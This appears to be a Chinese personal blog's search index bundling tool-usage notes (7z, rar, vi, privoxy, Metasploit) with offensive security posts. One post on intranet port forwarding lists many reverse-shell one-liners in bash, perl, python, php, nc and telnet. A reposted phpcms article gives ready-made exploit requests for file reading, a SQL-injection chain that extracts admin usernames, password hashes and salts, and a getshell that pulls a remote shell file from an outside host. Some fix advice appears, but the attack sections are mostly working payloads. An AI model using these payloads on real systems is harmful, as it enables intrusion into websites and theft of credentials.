<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[metasploit数据库配置]]></title>
    <url>%2F2017%2F09%2F08%2FmsfdbInit%2F</url>
    <content type="text"><![CDATA[当我们没有配置数据库的时候，使用的是慢速查找，找一个模块往往需要一分钟以上的时间。而我们设置了数据库之后，1秒就能查找到。因此我们来看一下应该怎么配置msf的数据库。 metasploit数据库配置第一步1service postgresql start 启动服务 第二步1msfdb init 初始化msf数据库（默认创建的数据库名：msf，msf_test;用户名：msf；口令默认为空） 第三步1234msfconsole 进入msf控制台db_status 查看数据库连接状态[*] postgresql connected to msfdb_rebuild_cache 重建缓存（该操作需要一定时间，请等待三分钟后再搜索） 完成了，三分钟之后再search一次试试看。如果还是不行，请退出再重开msfconsole试一试]]></content>
      <categories>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
        <tag>msfdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7z.exe的简单使用方法]]></title>
    <url>%2F2017%2F09%2F06%2Ftool7z%2F</url>
    <content type="text"><![CDATA[如题 7z.exe的简单使用方法-t 指定压缩档案格式。指定压缩档案格式。它们可以是：zip、7z、rar、cab、gzip、bzip2、tar 或其它格式。而 默认值是 7z 格式。 压缩：123456压缩文件夹（保存文件夹结构）：7z.exe a &quot;压缩文件名&quot; &quot;要压缩的文件夹&quot;压缩指定文件类型（exe，无法压缩子文件夹中的文件）：7z.exe a &quot;压缩文件名&quot; &quot;*.exe&quot;参数a： 添加 解压：1234567z x 压缩文件名 -y -aos -o&quot;解压目录&quot;x:完整路径下解压文件-y:所有确认选项都默认为是（即不出现确认提示）-aos:跳过已存在的文件-o:设置输出目录 高级压缩的例子：123456789101112131415161718192021227z a -t7z archive.7z *.exe *.dll -m0=BCJ -m1=LZMA:d=21 -ms -mmt添加 *.exe 及 *.dll 文件到固实压缩档案 archive.7z。使用 LZMA 压缩算法、2 MB 字典大小及 BCJ 转换器。压缩将开启多线程优化(如果可用)。-ms 默认设置固实模式。在创建固实压缩档案模式中，它把压缩档案中的所有文件都当成一个连续数据流来看待。通常情况下，固实压缩可增加压缩比，特别是在添加大量小文件的时候-mmt 默认开启多线程模式。-m0=BCJ -- 第一个备选的压缩算法为BCJ-m1=LZMA:d=21 -- 第二个备选的压缩算法为LZMA，指定字典大小为默认的21(2MB的1次方)2MB。想要使用最大化压缩，可以使用下面的参数选项：7z a -t7z DriverTest_1.7z &quot;I:\t\t1\*&quot; -mx=9 -ms=200m -mf -mhc -mhcf -m0=LZMA:a=2:d=25:mf=bt4b:fb=64 -mmt -r-t7z -- 压缩文件的格式为7z-mx=9 -ms=200m -mf -mhc -mhcf -m0=LZMA:a=2:d=25:mf=bt4b:fb=64 -mmt-- 指定压缩算法选项-mx=9 -- 设置压缩等级为极限压缩（默认为：LZMA 最大算法、32 MB 字典大小、BT4b Match finder、单词大小为 64、BCJ2 过滤器）-ms=200m -- 开启固实模式，设置固实数据流大小为200MB。-mf -- 开启可执行文件压缩过滤器。-mhc -- 开启档案文件头压缩。-mhcf -- 开启档案文件头完全压缩。我所使用的7z版本为4.42&gt;2.30。-m0=LZMA:a=2:d=25:mf=bt4b:fb=64-- 第一个备选压缩算法为LZMA，压缩等级为最大压缩，LZMA算法使用的字典大小为25(2MB的5次方)32MB，算法的匹配器为bt4b(所需要内存为d×9.5 + 34 MB)，压缩算法的紧凑字节为最大模式的64字节。-mmt -- 开启多线程模式。-r -- 递归到所有的子目录。]]></content>
      <categories>
        <category>工具使用说明</category>
      </categories>
      <tags>
        <tag>工具使用说明</tag>
        <tag>7z.exe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rar.exe的使用方法]]></title>
    <url>%2F2017%2F09%2F06%2FtoolRar%2F</url>
    <content type="text"><![CDATA[如题 rar.exe的使用方法压缩命令1234567891011121314151617181920212223压缩文件夹（不包含子目录）：rar.exe a &quot;压缩包保存路径文件名&quot; &quot;被压缩的文件夹路径&quot;压缩文件夹（包含子目录）：rar.exe a -r &quot;压缩包保存路径文件名&quot; &quot;被压缩的文件夹路径&quot;压缩文件夹（以时间命名压缩包）：rar.exe a -ag -r -s -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;被压缩的文件夹路径&quot;加密压缩文件夹（以时间命名压缩包，密码：123）：rar.exe a -ag -r -s -ibck -p123 &quot;压缩包保存路径&quot; &quot;被压缩的文件夹路径&quot;带文件头的加密压缩：rar.exe a -ag -r -s -ibck -HP123 &quot;压缩包保存路径&quot; &quot;被压缩的文件夹路径&quot;压缩多个文件（以时间命名压缩包）：rar.exe a -ag -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;文件名1&quot; &quot;文件名2&quot;压缩指定文件类型（exe）：rar.exe a -ag -r -s -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;被压缩的文件夹路径\*.exe&quot;压缩含有指定字符的文件（匹配test）：rar.exe a -ag -r -s -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;被压缩的文件夹路径\*test*&quot; 解压命令1234567891011解压RAR到当前目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot;解压RAR到指定目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot; -AD &quot;指定目录&quot;解压RAR中指定文件类型（exe）到当前目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot; *.exe解压RAR中指定文件类型（exe）到指定目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot; *.exe -AD &quot;指定目录&quot; [语法]123RAR &lt;命令&gt; [ -&lt;开关1&gt; -&lt;开关N&gt; ] &lt;压缩文件&gt; [ &lt;@列表文件...&gt; ]RAR [ &lt;文件...&gt; ] [ &lt;解压路径/&gt; ] 简要参数说明：12345678910111213141516171819a :备份所有文件；-ag :当创建压缩文件时，以格式“YYYYMMDDHHMMSS”附加当前日期字符串,文件名YYYYMMDDHHMMSS.rar；-k :锁定压缩文件；-r:备份目录和子目录；-s :创建固实压缩文件，提高压缩率；-ibck :后台运行；X ：从压缩包中带绝对路径解压指定文件到当前路径-Y ：覆盖已存在文件-p ：加密压缩，解压时需要密码-HP ：带文件头加密，更安全，没有密码无法查看里面的文件列表]]></content>
      <categories>
        <category>工具使用说明</category>
      </categories>
      <tags>
        <tag>工具使用说明</tag>
        <tag>rar.exe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网攻击环境模拟（端口转发）]]></title>
    <url>%2F2017%2F09%2F05%2FportForward%2F</url>
    <content type="text"><![CDATA[如题 内网攻击环境模拟（端口转发）测试工具：123456789htran3fpipelcxnc（linux、windows）bashpythonphpnc 无essh代理 总体环境概况（总的环境，具体每个工具使用时可能会有所出入）： 123456攻击机：ubu_ter 192.168.20.149攻击机：win10 192.168.20.191 192.168.20.76服务器：ubu_blog 192.168.20.111 192.168.174.11服务器：server2003 192.168.174.129 192.168.20.181目标机：Ubuntu2 192.168.174.128目标机：winXP 192.168.174.130 实验一、使用htran.exe远程登录目标winXP的33891234567891011**环境：**攻击机（个人笔记本，内网）：Ubuntu2 192.168.20.145攻击机（VPS，公网）：win10 192.168.20.191 192.168.20.76服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**攻击机win10上执行：htran3.exe -Listen 9999 8888服务器server2003上执行：htran3.exe -slave 192.168.20.191 9999 192.168.174.130 3389用法：htr3.exe -slave 攻击机IP 攻击机监听端口 目标机IP 目标机端口将目标机的3389端口转发到本地的8888端口，使用另一台攻击机Ubuntu2的rdesktop连接win10的8888端口即可 实验二、使用fpipe远程登录目标winXP的338912345678910111213**环境：**攻击机（VPS，公网）：win10 192.168.20.191 192.168.20.76攻击机（个人笔记本，内网）：Ubuntu2 192.168.20.145服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**在服务器上执行：fpipe.exe -l 1234 -s 1000 -r 3389 192.168.174.130意思是将发送到服务器本机1000端口的链接通过1234端口被重定向到了目标机IP的3389端口上，然后再链接服务器的1234端口，即可链接到目标机的3389上然后在攻击机上使用mstsc链接192.168.20.181:1234疑惑：在攻击机win10上使用mstsc进行链接，刚建立连接就会断开在攻击机ubuntu2上使用rdesktop进行链接，成功建立长时间连接 实验三、使用lcx远程登录目标winXP的3389123456789101112**环境：**攻击机（VPS，公网）：win10 192.168.20.191 攻击机（个人笔记本，内网）：Ubuntu2 192.168.20.145服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**先在win10上：lcx.exe -listen 51 3389监听51端口，转发到本机的3389端口然后在服务器上执行：lcx.exe -slave 192.168.20.191 51 192.168.174.130 3389将目标机winXP的3389转发到攻击机win10（VPS）的51端口上在攻击机Ubuntu2上：rdesktop 192.168.20.191:3389 实验四、使用nc得到服务器server2003的cmdShell12345678**环境：**攻击机：win10 192.168.20.191 服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**在服务器server2003上：nc -l -p 8888 -t -e cmd.exe（-t参数可省略）在攻击机win10上：nc -nvv 192.168.20.181 8888 实验五、使用nc得到服务器ubu_blog的shell12345678910111213141516171819202122232425262728293031323334353637**环境：**攻击机：Ubuntu2 192.168.20.145服务器：ubu_blog 192.168.20.111 192.168.174.11目标机：Ubuntu2 192.168.174.128**步骤：**在攻击机Ubuntu2上：nc -lvv 1234（如果有错再添加0.0.0.0，windows不行，-lvnp也可以）在服务器ubu_blog上：（1）bash版本bash -i &gt;&amp;/dev/tcp/192.168.20.149/1234 0&gt;&amp;1或： /bin/bash -i &gt; /dev/tcp/192.168.20.149/1234 0&lt;&amp;1 2&gt;&amp;1（2）perl版本perl -e &apos;use Socket;$i=&quot;192.168.20.149&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;（3）python版本python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.20.149&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;（4）php版本php -r &apos;$sock=fsockopen(&quot;192.168.20.149&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;（5）nc -e /bin/sh 192.168.20.149 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.20.149 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999（6）JAVA版本（不会用）r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.20.149/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()（7）LUA版本（尝试失败）lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;192.168.20.149&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;（8）Hacker:nc -lvnp listenportVictim:mknod /tmp/backpipe pVictim:/bin/sh 0&lt;/tmp/backpipe | nc 192.168.20.149 1234 1&gt;/tmp/backpipe（9）不使用ncMethod 2:Hacker: nc -nvlpp8080Victim: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe（10）Method 3:（尝试失败）Hacker: nc -nvlp 8080Hacker: nc -nvlp 8888Victim: telnet 192.168.20.149 8080 | /bin/bash | telnet 192.168.20.149 8888 实验六、SSH代理（putty）1234567891011**环境：**代理服务器：ubu_ter 192.168.17.128（仅主机模式，不可上网）本地机：win10 192.168.20.191（可上网），192.168.17.1**步骤：**打开putty的会话界面，填入主机名称和端口然后在左侧：连接——》SSH——》通道——》增加端口：7070，动态——》打开输入用户名和密码，登陆成功此时打开cmd，输入netstat -an，可以看到这么一条打开浏览器，在浏览器中设置代理：socks5 127.0.0.1:7070此时浏览器变得无法上网，设置成功]]></content>
      <categories>
        <category>端口转发</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下使用privoxy将socks转换为http代理]]></title>
    <url>%2F2017%2F09%2F04%2FsocksTOhttp%2F</url>
    <content type="text"><![CDATA[shadowsocks是socks5代理，但有的程序不支持socks代理（终端），只支持HTTP代理，怎么办呢？这个时候我们就需要将socks代理转换为http代理了。 linux下使用privoxy将socks转为http代理privoxy具有将socks代理转为http代理的功能。 1.开启shadowsocks根据自己SS的配置来 2.安装privoxy。1$ sudo apt-get install privoxy 3.更改provoxy配置12345位置在“/etc/privoxy/config”。$ sudo vim /etc/privoxy/config在里面添加：forward-socks5 / 127.0.0.1:1080 .listen-address localhost:8118 4.重启privoxy。1$ service privoxy restart 5.现在就可以使用http代理1http_proxy=http://localhost:8118 curl ip.gs 查看当前ip。 终端想使用代理就在每条命令前加上“http_proxy=http://localhost:8118”即可]]></content>
      <categories>
        <category>代理配置</category>
      </categories>
      <tags>
        <tag>代理</tag>
        <tag>privoxy</tag>
        <tag>shadowsocks</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vi使用笔记]]></title>
    <url>%2F2017%2F09%2F04%2Fvi-sum-up%2F</url>
    <content type="text"><![CDATA[如题 VI使用笔记文本查找12345678910111213/ 向下查找，输入n可以按相同的方向继续查找，N向相反的方向继续查找（notepad用F3）? 向上查找，同上，搜索字符串中如果包含由特殊含义的字符需要在前面加上\f 向下搜索某行中的单个字符F 向上搜索某行中的单个字符t 向下搜索，并把光标定位到匹配字符的前面T 向上搜索，并把光标定位到匹配字符的后面部分特殊字符列表：^ 匹配一行的开头. 匹配一个字符* 匹配0个或多个字符$ 匹配一行的结尾[] 匹配一组字符 移动光标：12h 向左 j 向下 k 向上 l 向右例：普通模式下输入3j，会向下移动3行 复制粘贴：12345yy 复制当前行nyy 复制n行yw 复制一个字（单词）p 将复制的文本粘贴到光标后面P 将复制的文本粘贴到光标前面 文本替换：123:s/search/replace/g 将当前行的所有search替换为replace:n,$s/old/new/g 将从第n行开始到最后一行的所有old替换为new（n若是&quot;.&quot;，表示从当前行开始到最后一行）:n,$s/old/new 将从第n行开始到最后一行的每一行的第一个old替换为new 模式切换：12两次ESC回到普通模式ZZ 保存并退出，方便快捷 插入字符：123456i 光标的前面插入I 当前行的开头插入文本a 光标的后面插入A 当前行的末尾插入文本o 在当前行的下一行插入空行O 在当前行的上一行插入空行 删除字符：1234567x 删除当前光标下的字符X 删除光标前面的字符dw 删除从当前光标到单次解围的字符d^ 删除从当前光标到行首的字符d$ 删除从当前光标到行尾的字符D 删除从当前光标到行尾的字符dd 删除当前光标所在的行，3dd删除3行 修改字符：1234567cc 删除当前行并进入编辑模式C 当前行的光标所在位置清空并进行编辑cw 删除当前字（单词），并进入编辑模式r 替换当前光标下的字符（替换单个字母用）R 从当前光标开始替换字符，按ESC退出s 用输入的字符替换当前字符，并进入编辑模式S 用输入的文本替换当前行，并进入编辑模式 屏幕移动：123H移动到屏幕顶部，nH移动到屏幕第n行的位置M移动到屏幕中间L移动到屏幕底部 文章移动命令：12345678910gg跳到文档开头G跳到文档结尾，1G 或 :1 移动到文件第一行0或|回车，跳到当前行开头$跳到当前行结尾w定位到上一个单词b定位到下一个单词(定位到一句话的开头，句子是以!.?三种符号来界定)定位到一句话的结尾&#123;移动到段落开头&#125;移动到段落结尾 控制命令：1234567ctrl+d 向后滚动半屏ctrl+f 向后滚动全屏ctrl+u 向前滚动半屏ctrl+b 向前滚动整屏ctrl+e 向下滚动一行ctrl+y 向上滚动一行ctrl+I（大写的i）刷新屏幕 高级命令1234567891011121314151617J 将当前行和下一行链接为一行&lt;&lt; 将当前行左移一个单位（一个缩进宽度）&gt;&gt; 将当前行右移一个单位~ 改变当前字符的大小写ctrl+G 可以显示当前文件名和状态U 撤销对当前行所做的修改u 撤销上次操作:f 以百分比的形式显示当前光标在文中的位置、文件名和文件的总行数:f filename 将文件重命名为filename:w filename 保存修改到filename:e filename 打开另一个名为filename的文件:cd dirname 改变当前工作目录到dirname:e # 在的两个打开的文件之间进行切换:n 如果用vi打开了多个文件，切换到下一个文件:p 如果用vi打开了多个文件，切换到上一个文件:r file 读取文件并在当前行的后面插入:nr 读取文件并在第n行后面插入]]></content>
      <categories>
        <category>vi</category>
      </categories>
      <tags>
        <tag>vi</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpcms漏洞利用【转载】]]></title>
    <url>%2F2017%2F08%2F31%2FphpcmsLoopholes%2F</url>
    <content type="text"><![CDATA[如题所示 phpcms漏洞 最近某位大牛说，将放出3个phpcms的0day漏洞，目前我所了解到的已经有2个phpcms漏洞被流传开来，并放出了poc。phpcms应用范围还是比较广的，在此记录分享一下几个最新的phpcms漏洞。 免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负phpcms 任意文件读取漏洞 更新于2017年5月4日漏洞具体细节参考：http://bobao.360.cn/learning/detail/3805.html 漏洞利用方案一：登录普通用户，访问链接：1http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70C 获取分配的att_json,然后将这段json值带入到down类的init函数中去： 1http://localhost/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=013ceMuDOmbKROPvvdV0SvY95fzhHTfURBCK4CSbrnbVp0HQOGXTxiHdRp2jM-onG9vE0g5SKVcO_ASqdLoOSsBvN7nFFopz3oZSTo2P7b6N_UB037kehz2lj12lFGtTsPETp-a0mAHXgyjn-tN7cw4nZdk10Mr2g5NM_x215AeqpOF6_mIF7NsXvWiZl35EmQ 方案二：在未登录的情况下访问：1http://localhost/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1 获取当前的siteid,然后再访问: 12http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70CPOST_DATA:userid_flash=14e0uml6m504Lbwsd0mKpCe0EocnqxTnbfm4PPLW 修复方案升级至官方最新版本 phpcms sql漏洞Poc存在sql注入漏洞的页面： 1http://192.168.1.139:8080/phpcms/index.php?m=member&amp;c=index&amp;a=login 获取当前数据库，post： 1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bdatabase())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取当前用户，post： 1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取表名：1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2btable_name%2bfrom%2binformation_schema.tables%2bwhere%2btable_schema=&apos;phpcmsv9&apos;%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 若要获取其他表名，修改limit即可。 获取用户名:1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2busername%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取密码1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取到的密码为30位的md5，一般的MD5是32位，所以我们需要再获取后2位：1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(substring((select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c-2%252c2))%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 phpcms是加盐（salt）的，获取salt:1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bencrypt%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 以上Poc来自：https://www.unhonker.com/bug/1834.html exp漏洞利用脚本exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/exp脚本可以参考：https://www.waitalone.cn/phpcmsv9-authkey-exp.html漏洞细节请参考：http://mp.weixin.qq.com/s/cI-wbQyX-3WLhxJ5kqez4A 漏洞修复方案去掉modules\content\down.php文件 phpcms注册页面getshell漏洞存在的漏洞：php远程文件包含、任意文件上传 漏洞利用点：phpcms注册页面 利用类型：http post请求导致任意文件上传+getshell Post Poc1siteid=1&amp;modelid=11&amp;username=newbie&amp;password=newbie&amp;email=newbie@qq.com&amp;info[content]=&lt;img src=http://shhdmqz.com/newbie.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol= 注意：http://shhdmqz.com/newbie.txt为远程服务器上的shell文件，这个漏洞利用了远程文件包含与文件上传漏洞。 漏洞利用细节 访问注册页面发送post包，重构info字段内容，写入远程包含的文件地址《img src=http://shhdmqz.com/newbie.txt?.php#.jpg》，newbie.txt为文件名，?.php#.jpg为构造的文件名，为了绕过后缀名限制。回包将会有报错信息，但文件可以上传成功，且报错信息中含有上传的文件路径，可用菜刀链接。 exp漏洞利用脚本exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/ 漏洞修复方案暂时性修复： 关闭注册页面关闭远程文件包含，即关闭allow_url_fopen 彻底性修复： 12345修改phpcms/libs/classes/attachement.class.php文件中的download函数在foreach($remotefileurls as $k=&gt;$file)循环中，大约是167行左右的位置，将if(strpos($file, &apos;://&apos;) === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file);修改成$filename = fileext($k); 关于文件包含漏洞，可参考：文件包含漏洞 任意文件读取漏洞1index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=..\/..\/caches/error_log.php phpcms敏感信息1234默认账号密码：phpcms/phpcms默认后台： http://www.xx.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=会员中心地址：index.php?m=member&amp;c=index&amp;a=login本篇将持续跟踪phpcms最新漏洞状况，并附上检测方法以及修复方案，协助管理员早日修复漏洞，谢谢！ 本文标题:phpcms漏洞文章作者:nMask发布时间:2017年04月12日 - 09:04最后更新:2017年07月25日 - 20:07原始链接:http://thief.one/2017/04/12/1/许可协议: 署名-非商业性使用-禁止演绎 4.0 国际 转载请保留原文链接及作者。]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>-phpcms -漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu安装完成可以做的一些事]]></title>
    <url>%2F2017%2F08%2F29%2FnewUbuntu%2F</url>
    <content type="text"><![CDATA[如题所示 可以做的有：1、换源根据自己安装的Ubuntu版本，去网上找相应的源，源文件位置：/etc/apt/source.list这里给出Ubuntu14.04搜狐源： 12345678910deb http://mirrors.sohu.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-backports main restricted universe multiverse 将上面内容复制后，输入1sudo vim /etc/apt/source.list 编辑源文件，在命令行模式下按p进行粘贴，输入:wq回车，进行保存 12sudo apt-get update #更新软件索引列表sudo apt-get upgrade #更新所有软件（不建议） 2、安装SSH、FTP、Telnet（有的系统会自行安装） 先尝试service /etc/init.d/ssh start 或者 cd /etc/init.d 再service ssh start 若是无回显则ssh开启， service ssh status 查看ssh状态 